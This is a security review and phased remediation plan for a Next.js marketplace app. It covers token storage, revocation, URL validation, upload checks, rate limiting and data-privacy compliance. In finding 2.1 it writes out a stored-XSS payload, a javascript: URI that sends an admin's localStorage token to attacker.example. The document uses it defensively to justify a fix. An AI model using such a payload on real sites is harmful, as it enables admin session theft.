# Security Review & Improvement Plan

**Scope:** `client/` — the full Next.js application (App Router API routes, Prisma/PostgreSQL data layer, JWT auth, Supabase storage).
**Method:** Manual source review of auth, authorization, data access, file upload, and configuration code. No dynamic/penetration testing was performed — treat unverified items as hypotheses to confirm.
**Reviewed:** 2026-09-05

## How to read this document

Each finding has a **Severity** (Critical / High / Medium / Low), **Evidence** (file:line), and a **Fix**. Section 5 turns everything into a prioritized, phased plan. Nothing here has been changed yet — this is the plan, not the patch.

---

## 1. Confidentiality — keeping data away from those who shouldn't see it

### 1.1 — CRITICAL: Auth token stored in `localStorage`, readable by any script on the page
**Evidence:** `src/contexts/AuthContext.tsx:30,48` — the JWT is written to and read from `localStorage`, and attached manually as `Authorization: Bearer <token>` on every fetch.
Because `localStorage` is plain JS-accessible storage, **any** XSS anywhere in the app (see 2.1) can read `localStorage.getItem('token')` and exfiltrate it. The token is valid for 7 days (`src/app/api/auth/login/route.ts:47`) and cannot be revoked (see 1.2), so a single stolen token is a week of full account access.
**Fix:** Move to an `httpOnly`, `Secure`, `SameSite=Strict` cookie set by the server; have API routes read the session from the cookie instead of an `Authorization` header. This trades a (mitigable) CSRF risk for eliminating a much worse XSS-to-full-takeover path. If a full rewrite isn't feasible short-term, at minimum shorten token lifetime (see 1.2) and prioritize closing 2.1.

### 1.2 — HIGH: No token revocation — logout, role change, and password change don't invalidate existing tokens
**Evidence:** `src/contexts/AuthContext.tsx:53-57` (`logout()` only deletes the local copy); JWTs are stateless with a 7-day expiry and there is no denylist/version check.
If a token is stolen, changing the password or suspending the account (`getActiveAuthUser` in `src/lib/getActiveAuthUser.ts:18-23`) blocks it — good, that check does hit the DB. But a **role change** or an intentional **logout** does nothing: the payload's `role` (`src/lib/auth.ts:3-7`) was baked in at login and is never re-checked, and a "logged out" token still authenticates until it expires.
**Fix:** Add a `tokenVersion` (or `sessionId`) column on `User`, embed it in the JWT, and check it against the DB on every request (you're already hitting the DB in `getActiveAuthUser` for the suspension check — this is a one-column addition to the same query). Bump it on logout, password change, and role change to invalidate old tokens immediately. Shorten the token lifetime (e.g. 1–24h) and consider a refresh-token pattern.

### 1.3 — HIGH: Government ID URLs are unvalidated and rendered as plain, clickable links to admins
**Evidence:** `src/app/api/users/me/route.ts:59` (server accepts any string for `idImageUrl`, no scheme/host check); rendered at `src/app/dashboard/users/page.tsx:359` and `src/app/farmer/profile/page.tsx:196` as `<a href={u.idImageUrl}>`.
This is also a confidentiality issue independent of the XSS angle in 2.2 below: ID "verification" is a free-text URL a farmer pastes in (e.g. a Google Drive link), not a file the app controls or stores. There's no guarantee the link stays valid/private, no audit of what's actually behind it, and no server-side handling of what is explicitly sensitive PII (a government ID).
**Fix:** Treat this as regulated PII (Philippine Data Privacy Act, RA 10173, applies — pesos in the schema suggest a PH deployment). Have the farmer *upload* the ID image through the existing `/api/upload` pipeline into a **private** Supabase bucket, and serve it to admins only via short-lived signed URLs — never a public, indefinitely-valid link. Define and enforce a retention/deletion policy for ID images once verification is complete or an account is deleted.

### 1.4 — MEDIUM: Uploaded images go into a public bucket with predictable names
**Evidence:** `src/app/api/upload/route.ts:36,59` — filename is `${actor.id}_${Date.now()}.${ext}`, uploaded to the public `product-images` bucket.
Fine for genuinely public product photos. Not fine if this same endpoint is ever reused for anything sensitive — filenames are guessable (known user ID + narrow timestamp window) and the bucket has no per-object access control.
**Fix:** Keep `product-images` public for product photos only; use a separate **private** bucket + signed URLs for anything not meant to be public (ID images per 1.3, future receipts, etc.). Consider a random suffix (`crypto.randomUUID()`) in filenames regardless.

### 1.5 — MEDIUM: No security response headers (defense-in-depth for confidentiality)
**Evidence:** `next.config.ts` exports an empty `{}` — no `headers()` block at all.
There's no Content-Security-Policy, `X-Content-Type-Options`, `Referrer-Policy`, or `Permissions-Policy`. These don't stop a determined attacker alone, but they meaningfully reduce the blast radius of any XSS (CSP can block exfiltration `fetch`/`img` calls to attacker domains) and stop MIME-sniffing and cross-origin leakage.
**Fix:** See §4.1.

### Confidentiality — what's already solid
- `.env` is correctly excluded via `.gitignore` and is **not** committed (`git ls-files | grep .env` returns nothing).
- Passwords are hashed with `bcryptjs` (cost 10) — never stored or logged in plaintext.
- API error responses are generic (`"Failed to fetch users"`, etc.) — no stack traces or internal details leak to clients.
- Role-restricted admin endpoints (`/api/admin/*`) consistently `select` only intended fields and gate on `authorize()`.

---

## 2. Integrity — keeping data and code paths trustworthy

### 2.1 — CRITICAL: Stored XSS via `idImageUrl` → admin session takeover
**Evidence:** `src/app/api/users/me/route.ts:59` accepts any string for `idImageUrl` with zero validation, then it's rendered as a raw anchor at `src/app/dashboard/users/page.tsx:359-362`:
```tsx
<a href={u.idImageUrl} target="_blank" rel="noopener noreferrer">
```
Any customer or farmer account can `PATCH /api/users/me` with:
```json
{ "idImageUrl": "javascript:fetch('https://attacker.example/x?t='+localStorage.getItem('token'))" }
```
When an admin opens **Users → Pending → View submitted ID**, the browser executes that `javascript:` URI in the admin's authenticated context, reading `localStorage` (see 1.1) and handing the attacker a live admin token — full privilege escalation from any unprivileged account. `rel="noopener noreferrer"` does not stop this; it only affects `window.opener`, not the URI scheme.
**Fix (do this first — it's the single highest-impact item in this review):**
1. Validate on the server (`src/app/api/users/me/route.ts`): reject anything whose parsed scheme isn't `http:`/`https:` before saving.
2. Validate again on render: never interpolate an unvalidated string into `href`; check the scheme client-side too (defense in depth — the server check is bypassable by a second write path in the future).
3. This closes the same class of bug for `Banner.ctaLink`, `Faq` fields, and any other user/admin-editable URL field — audit for the same pattern (`grep -rn "href={.*Url"` across `src/app`).

### 2.2 — HIGH: Race condition on stock decrement can oversell inventory
**Evidence:** `src/app/api/orders/route.ts:34-38,49-51,84-89` — inside one `prisma.$transaction`, stock is *checked* (`product.stock < item.quantity`) and *decremented* (`decrement: item.quantity`) as separate steps. Under PostgreSQL's default Read Committed isolation, two concurrent orders for the last unit of a product can both pass the check before either applies its decrement, taking stock negative and both customers paying for stock that doesn't exist.
**Fix:** Make the decrement conditional and atomic in one statement, e.g. a `updateMany` with `where: { id, stock: { gte: quantity } }` and check the returned count — if 0 rows updated, the transaction throws "insufficient stock" and rolls back. This removes the check-then-act gap entirely.

### 2.3 — MEDIUM: Uploaded file type is trusted from the client-supplied MIME type, not verified content
**Evidence:** `src/app/api/upload/route.ts:18-19` — `file.type.startsWith('image/')` is the only check; `file.type` is attacker-controlled (it's just what the browser/client sends), and `image/svg+xml` passes this check. SVG can embed `<script>`; if ever rendered inline or opened directly rather than via `<img>`, that's stored XSS. There's also no magic-byte/re-encode step, so file *contents* can be arbitrary regardless of the declared type.
**Fix:** Explicitly allow-list extensions/MIME types (`png`, `jpg/jpeg`, `webp` — exclude `svg`), and verify the first bytes match an expected image signature server-side before upload (or pipe through an image re-encode, which also strips EXIF/GPS metadata — see 3.4).

### 2.4 — LOW: Stale role/permissions in already-issued tokens
**Evidence:** Same root cause as 1.2 — `role` is baked into the JWT at login and never re-verified. If an admin demotes a manager, that manager keeps manager-level API access for up to 7 days.
**Fix:** Covered by the `tokenVersion` fix in 1.2 (bump on role change too).

### Integrity — what's already solid
- **No SQL injection surface**: all data access goes through Prisma's parameterized query builder; no `$queryRaw`/`$executeRaw` usage found anywhere in the codebase.
- **Order pricing is server-derived**, not client-trusted (`src/app/api/orders/route.ts:59-62` computes `totalAmount` from the DB `product.price`, ignoring any price the client might send).
- **Role assignment on registration is hardcoded** to `farmer`/`customer` only (`src/app/api/auth/register/route.ts:18`) — a request can't self-assign `admin`/`manager`.
- Admin user-management routes have thoughtful, layered authorization (managers can't touch admins/other managers, nobody can suspend/delete themselves, admins can't delete other admins) — see `src/app/api/admin/users/[id]/route.ts:32-41`.
- IDOR-conscious query patterns: e.g. messages are always scoped to `senderId: actor.id OR receiverId: actor.id` server-side (`src/app/api/messages/[userId]/route.ts:16-19`), not trusted from client params.
- An `AuditLog` table records sensitive admin actions (suspend, verify, password reset, order creation) with actor attribution.

---

## 3. Availability — keeping the app up and usable under load or abuse

### 3.1 — HIGH: No rate limiting anywhere — login, register, upload, all APIs
**Evidence:** No rate-limiting library, middleware, or manual throttling found anywhere in `src/` (confirmed by search).
`/api/auth/login` accepts unlimited attempts per IP/account — trivial to brute-force or credential-stuff, especially against 6-character minimum passwords (3.3). `/api/auth/register` accepts unlimited signups (bot/spam accounts, storage/DB bloat). `/api/upload` accepts unlimited 4MB uploads per authenticated user, which is a direct storage-cost and bandwidth abuse vector.
**Fix:** Add rate limiting at the edge (Vercel's `@vercel/firewall` / Edge Config, or a lightweight IP+account limiter backed by Upstash Redis, which pairs well with Vercel serverless). Prioritize `/api/auth/login`, `/api/auth/register`, and `/api/upload`. Add exponential backoff / temporary lockout after repeated failed logins for a given account.

### 3.2 — MEDIUM: No confirmed connection pooling for Postgres in a serverless deployment
**Evidence:** `src/lib/prisma.ts:7-9` opens a `pg.Pool` per module instance with no explicit `max` connection limit, and there's no visible PgBouncer/Prisma Accelerate layer in this file. On Vercel, each concurrent serverless invocation can spin up its own instance; without a pooler in front of Postgres, traffic spikes can exhaust `max_connections` and the app goes down for everyone, not just the spiking endpoint.
**Fix:** Confirm `DATABASE_URL` points at a pooled connection (e.g. Supabase's port-6543 pgbouncer endpoint, since Supabase Storage is already in use) rather than the direct Postgres port. Explicitly cap `new Pool({ max: N })` to a value safe for your plan's connection limit × expected concurrent lambdas.

### 3.3 — LOW: Weak password floor invites credential-stuffing success
**Evidence:** `src/app/api/auth/register/route.ts:15`, `src/app/api/users/me/route.ts:45`, `src/app/api/admin/users/[id]/route.ts:50` all enforce only `length >= 6`, no complexity or breach-list check.
Combined with no rate limiting (3.1), 6-character passwords are crackable/stuffable at scale.
**Fix:** Raise the floor (12+ recommended) and/or check against a breach corpus (e.g. HaveIBeenPwned's k-anonymity API) at registration/password-change time. Pair with 3.1 either way — length alone doesn't fix a missing rate limit.

### Availability — what's already solid
- Stock and "same farmer per order" checks happen inside a DB transaction, so a failed order doesn't leave partial state.
- Vercel/Next.js gives you HTTPS, CDN, and horizontal scaling by default — no custom infra to keep up.

---

## 4. Other Security & Privacy Concerns

### 4.1 — MEDIUM: Missing HTTP security headers
**Evidence:** `next.config.ts` has no `headers()` config.
**Fix:** Add to `next.config.ts`:
- `Content-Security-Policy` (start report-only, tighten iteratively — this is your best structural mitigation for 2.1-style issues going forward)
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy` (deny camera/mic/geolocation you don't use)
- `Strict-Transport-Security` (Vercel serves HTTPS already; HSTS pins it)
Clickjacking (`X-Frame-Options` / `frame-ancestors`) is lower priority here since there's no obviously destructive single-click admin action, but cheap to add.

### 4.2 — MEDIUM: No centralized route-protection layer
**Evidence:** `src/middleware/` exists but is **empty**; there is no root `middleware.ts`. Every one of the 38 API routes re-implements its own `getActiveAuthUser` + `authorize()` call.
Today that discipline is consistently applied (verified findings above found no route skipping the suspension check). But it's a per-route, per-developer responsibility with no structural backstop — the day someone adds a route and forgets the check, it silently ships open. This is a process/architecture risk more than a live bug today.
**Fix:** Add a small shared wrapper (e.g. `withAuth(handler, { roles })`) that routes call into, or a `middleware.ts` for path-based protection of `/api/admin/*` at minimum, so "forgot the check" becomes a build-time/structural impossibility rather than a code-review hope.

### 4.3 — MEDIUM: Email enumeration on registration
**Evidence:** `src/app/api/auth/register/route.ts:24-29` returns `"Email already exists"` distinctly from other validation errors.
Lets an attacker enumerate which emails have accounts (useful for targeted phishing/credential stuffing). Login already avoids this correctly (generic `"Invalid credentials"`).
**Fix:** Low-severity, judgment call — many apps accept this tradeoff for UX. If you want to close it: return a generic "check your email to complete registration" and send a "you already have an account" email instead of a differing API response.

### 4.4 — LOW: No MFA / no account-recovery (forgot-password) flow
**Evidence:** No `forgot`/`reset` routes exist; only an authenticated in-profile password change (`src/app/api/users/me/route.ts`) and an admin-driven reset (`src/app/api/admin/users/[id]/route.ts`). No MFA anywhere.
**Fix:** Not urgent given the app's current scale, but plan for: a token-based (not security-question-based) password reset flow with short-lived, single-use tokens emailed to the account address, and consider optional TOTP MFA for `admin`/`manager` roles specifically, since those are the highest-value targets.

### 4.5 — LOW: Dependency/supply-chain hygiene not verifiable from source alone
**Evidence:** `package.json` uses caret ranges (`^`) on all dependencies; no `npm audit`/Dependabot/Snyk config found in the repo.
**Fix:** Run `npm audit` and address anything High/Critical; enable GitHub Dependabot (or Renovate) for automated dependency PRs; consider pinning exact versions for security-sensitive packages (`jsonwebtoken`, `bcryptjs`, `@prisma/client`) so upgrades are deliberate.

### 4.6 — LOW: Unused/dead scaffolding suggests intended-but-never-built validation layer
**Evidence:** `src/validators/` and `src/middleware/` are both present but empty; `zod` is a dependency but only used for **client-side** form validation (`src/app/login/page.tsx`, `src/app/register/page.tsx`) — every API route re-implements validation manually and inconsistently (compare the thorough checks in `register/route.ts` vs. the looser ones elsewhere).
**Fix:** Not a vulnerability by itself (server-side manual checks were consistently present in every route sampled), but worth consolidating: define zod schemas once in `src/validators/` and reuse server-side too, so client and server validation can't drift apart.

### Privacy note (Philippine Data Privacy Act, RA 10173)
Given the ₱ currency and the government-ID verification flow, this app processes regulated personal data (identity documents) and should have: a documented lawful basis/consent step at ID submission, data minimization (don't collect more than needed to verify), a retention/deletion policy, and breach-notification readiness. Items 1.3, 1.2, and 2.1 are the direct technical prerequisites for defensible compliance here.

---

## 5. Prioritized Remediation Plan

### Phase 0 — Immediate (this week; each is small and high-impact) — ✅ DONE 2026-09-05
| # | Finding | Action | Effort | Status |
|---|---|---|---|---|
| 1 | 2.1 Stored XSS via `idImageUrl` | Added `src/lib/url.ts` (`isSafeUrl`, allow-lists `http(s)`/same-site paths, rejects `javascript:`/`data:`/protocol-relative). Enforced server-side in `users/me`, `banners` (create+update), and `admin/site-content` PUT; enforced again client-side before rendering as `href` in `dashboard/users`, `farmer/profile`, homepage banner CTA, and the about page's Facebook link. | Small | Done |
| 2 | 2.2 Stock race condition | `api/orders/route.ts` now decrements stock via a conditional `updateMany({ where: { stock: { gte: quantity } } })` and rolls back the transaction if 0 rows matched, closing the check-then-act gap. | Small | Done |
| 3 | 3.1 No rate limiting | Added `src/lib/rateLimit.ts` (in-memory fixed-window limiter, documented as best-effort per-instance — not a substitute for Phase 1's shared-store upgrade if traffic grows). Applied: login 10 attempts/10min per IP, register 5/hour per IP, both returning `429` + `Retry-After`. | Medium | Done |

Verified with `tsc --noEmit` and `eslint` on all touched files — no new errors or warnings introduced.

### Phase 1 — Short-term (this sprint) — ✅ DONE 2026-09-05
| # | Finding | Action | Effort | Status |
|---|---|---|---|---|
| 4 | 1.2 / 2.4 No token revocation | Added `User.tokenVersion` (migration `20260905114921_add_token_version`), embedded in the JWT at login, checked against the DB in `getActiveAuthUser`. Bumped on: self password change (`users/me` PATCH), admin-forced password reset (`admin/users/[id]` PATCH), and a new `POST /api/auth/logout` that `AuthContext.logout()` now calls — logout and password changes invalidate the token immediately instead of leaving it valid for up to 7 days. Both profile pages now sign the user out and redirect to `/login` after a successful password change, since their current token stops working the moment the bump lands. **Note:** every session token issued before this deploy carries no `tokenVersion` claim, so it will fail the DB comparison and everyone gets signed out once — expected, one-time. | Medium | Done |
| 5 | 4.1 Missing security headers | Added `headers()` to `next.config.ts`: `X-Content-Type-Options`, `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy`, HSTS (enforced), plus `Content-Security-Policy-Report-Only` (kept report-only because Next's App Router streams hydration through inline `<script>` tags — tightening `script-src` past `'unsafe-inline'` needs per-request nonces via middleware, left as a follow-up). | Small | Done |
| 6 | 2.3 Unverified upload content | `api/upload/route.ts` now sniffs the actual file bytes (PNG/JPEG/WEBP magic numbers) instead of trusting `file.type`, and derives the stored extension/content-type from what it detected rather than the client-supplied filename. SVG is no longer accepted in any form. | Small | Done |
| 7 | 3.1 (cont.) | Extended the Phase 0 rate limiter to `/api/upload` — 20 uploads/hour per authenticated user. | Small | Done |
| 8 | 3.2 DB connection pooling | Capped `pg.Pool({ max: 5 })` in `src/lib/prisma.ts` with a comment on why, and noted that production's `DATABASE_URL` should point at a pooled endpoint (e.g. Supabase's port-6543 pgbouncer) — **not independently verified**, since that env var lives in Vercel, not this repo; worth a manual check. | Small | Done (pool cap); pooled-endpoint check still pending |
| 9 | 3.3 Password floor | Raised the minimum to 12 characters everywhere it's enforced: register route, self password-change, admin password-reset, and the matching client-side `zod` schema / `minLength` inputs. Breach-list (HIBP) check not implemented — left for a later pass. | Small | Done |

Verified with `tsc --noEmit`, `eslint`, and a live smoke test against the local dev server: register rejects <12-char passwords, login issues a token carrying `tokenVersion`, `/api/auth/logout` immediately invalidates that token (subsequent request returns 401), the login rate limiter returns 429 after 10 attempts/10min, and `idImageUrl` rejects a `javascript:` payload while accepting a normal `https://` URL.

**Build pipeline change:** `package.json`'s `build` script now runs `prisma migrate deploy` before `prisma generate`/`next build`, so the `tokenVersion` migration (and any future migration) applies to the production database automatically on every Vercel deploy, instead of requiring a manual step. This was a deliberate, confirmed change — flagged separately because shipping the `tokenVersion` code without it would have broken every authenticated request in production until the column existed.

### Phase 2 — Medium-term (this quarter)
| # | Finding | Action | Effort |
|---|---|---|---|
| 10 | 1.3 ID image handling | Move ID "upload" from free-text URL to real file upload into a private bucket + signed URLs; define retention/deletion policy | Large |
| 11 | 1.1 Token storage | Migrate JWT from `localStorage` to `httpOnly` cookie-based sessions | Large |
| 12 | 4.2 No centralized auth layer | Introduce a `withAuth`/middleware wrapper so route protection is structural, not per-file discipline | Medium |
| 13 | 4.4 Account recovery / MFA | Build token-based forgot-password flow; add optional TOTP for admin/manager | Medium |
| 14 | 4.6 Validation consolidation | Move ad-hoc route validation into shared `zod` schemas used both client and server side | Medium |

### Ongoing / process
| # | Finding | Action |
|---|---|---|
| 15 | 4.5 Dependency hygiene | Enable Dependabot; run `npm audit` in CI |
| 16 | 4.3 Email enumeration | Revisit if/when phishing targeting becomes a concern — currently accepted tradeoff |
| — | General | Re-run this review after Phase 2 lands; consider a light penetration test once auth model changes (1.1/1.2) ship, since that's the highest-risk area to regress |

---

## Summary

The application's core data-access layer is in good shape: Prisma eliminates SQL injection risk, order pricing is server-computed, role assignment can't be self-escalated at registration, and the sampled admin routes show real authorization thought (self-suspend/self-delete guards, role-hierarchy checks). The two findings that matter most are both concrete and fixable in under a day each: the `javascript:` URL stored-XSS path that lets any user pivot into an admin's session (2.1), and the fact that stolen or logged-out tokens stay valid for a week with no way to revoke them (1.1/1.2) — fixing the first without the second still leaves a wide window if a token leaks some other way. Everything else in this plan meaningfully reduces risk but isn't an active, exploitable path today the way those two are.
